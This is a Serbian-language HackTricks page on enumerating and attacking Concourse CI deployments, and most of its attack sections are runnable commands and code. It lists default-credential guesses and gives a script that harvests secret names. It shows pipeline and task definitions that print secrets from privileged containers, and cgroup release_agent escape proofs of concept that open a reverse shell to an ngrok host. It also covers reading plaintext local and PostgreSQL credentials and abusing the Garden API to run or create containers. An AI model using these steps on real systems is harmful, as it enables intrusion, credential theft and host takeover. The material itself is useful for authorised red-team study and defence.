# Enumeracija i napadi na Concourse

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Korisničke uloge i dozvole

Concourse dolazi sa pet uloga:

* _Concourse_ **Admin**: Ova uloga se dodeljuje samo vlasnicima **glavnog tima** (podrazumevani inicijalni Concourse tim). Admini mogu **konfigurisati druge timove** (npr. `fly set-team`, `fly destroy-team`...). Dozvole ove uloge ne mogu biti promenjene RBAC-om.
* **vlasnik**: Vlasnici tima mogu **izmeniti sve unutar tima**.
* **član**: Članovi tima mogu **čitati i pisati** unutar **resursa tima**, ali ne mogu menjati postavke tima.
* **operator-pipeline-a**: Operatori pipeline-a mogu izvršavati **operacije nad pipeline-om** kao što su pokretanje izgradnje i postavljanje resursa, ali ne mogu ažurirati konfiguracije pipeline-a.
* **gledalac**: Gledaoci tima imaju **"samo za čitanje" pristup timu** i njegovim pipeline-ima.

{% hint style="info" %}
Osim toga, **dozvole uloga vlasnik, član, operator-pipeline-a i gledalac mogu biti promenjene** konfigurisanjem RBAC-a (konfigurisanjem akcija na precizniji način). Pročitajte više o tome na: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Imajte na umu da Concourse **grupiše pipeline-ove unutar timova**. Stoga će korisnici koji pripadaju timu moći da upravljaju tim pipeline-ovima i **može postojati više timova**. Korisnik može pripadati više timova i imati različite dozvole u svakom od njih.

## Vars & Credential Manager

U YAML konfiguracijama možete konfigurisati vrednosti koristeći sintaksu `((_source-name_:_secret-path_._secret-field_))`.\
[Iz dokumentacije:](https://concourse-ci.org/vars.html#var-syntax) **source-name je opcionalno**, i ako se izostavi, koristiće se [credential menadžer na nivou klastera](https://concourse-ci.org/vars.html#cluster-wide-credential-manager), ili vrednost može biti obezbeđena [statički](https://concourse-ci.org/vars.html#static-vars).\
**Opciono** _**secret-field**_ specificira polje na dohvaćenom tajnom za čitanje. Ako se izostavi, menadžer akreditiva može odabrati da pročita 'podrazumevano polje' iz dohvaćenog akreditiva ako polje postoji.\
Osim toga, _**secret-path**_ i _**secret-field**_ mogu biti okruženi dvostrukim navodnicima `"..."` ako **sadrže posebne karaktere** poput `.` i `:`. Na primer, `((source:"my.secret"."field:1"))` će postaviti _secret-path_ na `my.secret` i _secret-field_ na `field:1`.

### Statičke promenljive

Statičke promenljive mogu biti navedene u **koracima zadatka**:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Ili koristite sledeće `fly` **argumente**:

* `-v` ili `--var` `IME=VREDNOST` postavlja string `VREDNOST` kao vrednost za varijablu `IME`.
* `-y` ili `--yaml-var` `IME=VREDNOST` parsira `VREDNOST` kao YAML i postavlja je kao vrednost za varijablu `IME`.
* `-i` ili `--instance-var` `IME=VREDNOST` parsira `VREDNOST` kao YAML i postavlja je kao vrednost za instancu varijable `IME`. Pogledajte [Grupisanje Pipelina](https://concourse-ci.org/instanced-pipelines.html) da biste saznali više o instanci varijabli.
* `-l` ili `--load-vars-from` `FAJL` učitava `FAJL`, YAML dokument koji sadrži mapiranje imena varijabli na vrednosti, i postavlja ih sve.

### Upravljanje akreditivima

Postoje različiti načini na koje se **Upravljač akreditivima može specificirati** u pipelini, pročitajte kako u [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Osim toga, Concourse podržava različite upravljače akreditivima:

* [Upravljač akreditivima Vault](https://concourse-ci.org/vault-credential-manager.html)
* [Upravljač akreditivima CredHub](https://concourse-ci.org/credhub-credential-manager.html)
* [Upravljač akreditivima AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
* [Upravljač akreditivima AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
* [Upravljač akreditivima Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
* [Upravljač akreditivima Conjur](https://concourse-ci.org/conjur-credential-manager.html)
* [Keširanje akreditiva](https://concourse-ci.org/creds-caching.html)
* [Skrivanje akreditiva](https://concourse-ci.org/creds-redacting.html)
* [Ponovno pokušavanje neuspelih preuzimanja](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Imajte na umu da ako imate neku vrstu **pristupa za pisanje u Concourse**, možete kreirati poslove da **izfiltrirate te tajne** jer Concourse mora da ima pristup njima.
{% endhint %}

## Enumeracija Concourse-a

Da biste enumerisali Concourse okruženje, prvo morate **prikupiti validne akreditive** ili pronaći **autentifikovani token** verovatno u konfiguracionom fajlu `.flyrc`.

### Prijavljivanje i enumeracija trenutnog korisnika

* Da biste se prijavili, morate znati **krajnju tačku**, **ime tima** (podrazumevano je `main`) i **tim kojem korisnik pripada**:
* `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
* Dobijanje konfigurisanih **ciljeva**:
* `fly targets`
* Provera da li je konfigurisana **veza sa ciljem** još uvek **validna**:
* `fly -t <target> status`
* Dobijanje **uloge** korisnika u odnosu na naznačeni cilj:
* `fly -t <target> userinfo`

{% hint style="info" %}
Imajte na umu da je **API token** podrazumevano **sačuvan** u `$HOME/.flyrc`, ako pljačkate mašine, tamo možete pronaći akreditive.
{% endhint %}

### Timovi i korisnici

* Dobijanje liste timova
* `fly -t <target> teams`
* Dobijanje uloga unutar tima
* `fly -t <target> get-team -n <team-name>`
* Dobijanje liste korisnika
* `fly -t <target> active-users`

### Pipelines

* **Lista** pipelina:
* `fly -t <target> pipelines -a`
* **Dobijanje** YAML definicije pipeline-a (**osetljive informacije** mogu se pronaći u definiciji):
* `fly -t <target> get-pipeline -p <pipeline-name>`
* Dobijanje svih deklarisanih **konfigurisanih varijabli** pipeline-a
* `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Dobijanje svih **imenovanih tajni koje se koriste** u pipelinima (ako možete kreirati/izmeniti posao ili preuzeti kontrolu nad kontejnerom, možete ih izfiltrirati):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
### Kontejneri i radnici

* Lista **radnika**:
* `fly -t <cilj> workers`
* Lista **kontejnera**:
* `fly -t <cilj> containers`
* Lista **izgradnji** (da biste videli šta se izvršava):
* `fly -t <cilj> builds`

## Napadi na Concourse

### Brute-Force za pristupne podatke

* admin:admin
* test:test

### Enumeracija tajni i parametara

U prethodnom odeljku smo videli kako možete **dobiti sve nazive tajni i promenljivih** koje koristi cevovod. **Promenljive mogu sadržati osetljive informacije**, a naziv **tajni će biti koristan kasnije za pokušaj krađe**.

### Sesija unutar pokrenutog ili nedavno pokrenutog kontejnera

Ako imate dovoljno privilegija (**uloga člana ili više**), moći ćete **da nabrojite cevovode i uloge** i jednostavno dobiti **sesiju unutar** kontejnera `<cevovod>/<posao>` koristeći:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Sa ovim dozvolama možda ćete moći:

* **Ukrasti tajne** unutar **kontejnera**
* Pokušajte **pobegnuti** na čvor
* Nabrojati/Zloupotrebiti **krajnju tačku metapodataka oblaka** (iz poda i sa čvora, ako je moguće)

### Kreiranje/Izmena Pipelina

Ako imate dovoljno privilegija (**član uloga ili više**), moći ćete **kreirati/izmeniti nove pipeline-ove**. Pogledajte ovaj primer:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Sa **izmenom/kreiranjem** nove cevovodne linije moći ćete:

* **Ukrasti** tajne (putem prikazivanja ili ulaska u kontejner i pokretanja `env` komande)
* **Pobegnuti** na **čvor** (davanjem dovoljno privilegija - `privileged: true`)
* Nabrojati/Zloupotrebiti **metapodatke oblaka** (iz poda i sa čvora)
* **Obrisati** kreiranu cevovodnu liniju

### Izvršavanje prilagođenog zadatka

Ovo je slično prethodnoj metodi, ali umesto modifikovanja/kreiranja potpuno nove cevovodne linije, možete **samo izvršiti prilagođeni zadatak** (što će verovatno biti mnogo **skrivenije**):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
### Bekstvo na čvor iz privilegovanog zadatka

U prethodnim sekcijama smo videli kako **izvršiti privilegovan zadatak sa Concourse-om**. Ovo neće dati kontejneru isti pristup kao privilegovana oznaka u Docker kontejneru. Na primer, nećete videti čvorovski uređaj fajl sistema u /dev, tako da bekstvo može biti "kompleksnije".

U sledećem PoC-u ćemo koristiti release\_agent za bekstvo sa nekim manjim modifikacijama:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Kao što ste primetili, ovo je samo [**obično bekstvo iz release_agenta**](broken-reference) samo što se menja putanja komande na cvoru
{% endhint %}

### Bekstvo na cvor iz Worker kontejnera

Za ovo je dovoljno obično bekstvo iz release_agenta sa manjom modifikacijom:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
### Bekstvo na čvor iz veb kontejnera

Čak i ako veb kontejner ima onemogućene neke odbrambene mehanizme, on **ne radi kao običan privilegovan kontejner** (na primer, **ne možete** **montirati** i **mogućnosti** su veoma **ograničene**, tako da su sve jednostavne metode bekstva iz kontejnera beskorisne).

Međutim, on čuva **lokalne akreditive u čistom tekstu**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Možete koristiti te podatke za **prijavu na veb server** i **kreiranje privilegovanog kontejnera i bekstvo na čvor**.

U okruženju takođe možete pronaći informacije za **pristup postgresql** instanci koju koristi Concourse (adresa, **korisničko ime**, **lozinka** i baza podataka, između ostalih informacija):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
### Zloupotreba Garden servisa - Nije pravi napad

{% hint style="warning" %}
Ovo su samo neke zanimljive beleške o servisu, ali zato što sluša samo na lokalnom računaru, ove beleške neće imati nikakav uticaj koji već nismo iskoristili ranije.
{% endhint %}

Podrazumevano, svaki Concourse radnik će pokretati [**Garden**](https://github.com/cloudfoundry/garden) servis na portu 7777. Ovaj servis se koristi od strane Web servera da bi radniku **pokazao šta treba da izvrši** (preuzimanje slike i pokretanje svakog zadatka). To zvuči prilično dobro za napadača, ali postoje neke lepe zaštite:

* Samo je **lokalno dostupan** (127.0.0.1) i mislim da kada se radnik autentifikuje na Web serveru pomoću posebnog SSH servisa, kreira se tunel tako da Web server može **komunicirati sa svakim Garden servisom** unutar svakog radnika.
* Web server **prati pokrenute kontejnere svakih nekoliko sekundi**, i **neočekivani** kontejneri se **brišu**. Dakle, ako želite **pokrenuti prilagođeni kontejner**, morate **izmeniti** komunikaciju između web servera i garden servisa.

Concourse radnici se pokreću sa visokim privilegijama kontejnera:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Međutim, tehnike poput **montiranja** /dev uređaja čvora ili release\_agent **neće raditi** (jer stvarni uređaj sa datotečnim sistemom čvora nije dostupan, samo virtuelni). Ne možemo pristupiti procesima čvora, pa je izlazak iz čvora bez eksploatacije jezgra komplikovan.

{% hint style="info" %}
U prethodnom odeljku smo videli kako da pobegnemo iz privilegovanog kontejnera, pa ako možemo **izvršiti** komande u **privilegovanom kontejneru** koji je kreirao **trenutni** **radnik**, možemo **pobeci na čvor**.
{% endhint %}

Imajte na umu da sam igrajući se sa Concourse-om primetio da kada se stvori novi kontejner za pokretanje nečega, procesi kontejnera su dostupni iz kontejnera radnika, pa je to kao da kontejner kreira novi kontejner unutar sebe.

#### Ulazak u pokrenuti privilegovani kontejner
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
#### Kreiranje novog privilegovanog kontejnera

Veoma lako možete kreirati novi kontejner (samo pokrenite nasumični UID) i izvršiti nešto na njemu:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Međutim, veb server proverava svakih nekoliko sekundi kontejnere koji se izvršavaju, i ako se otkrije neočekivan kontejner, biće obrisan. Pošto se komunikacija odvija putem HTTP-a, možete izmeniti komunikaciju da biste izbegli brisanje neočekivanih kontejnera:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
# Reference
* https://concourse-ci.org/vars.html

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
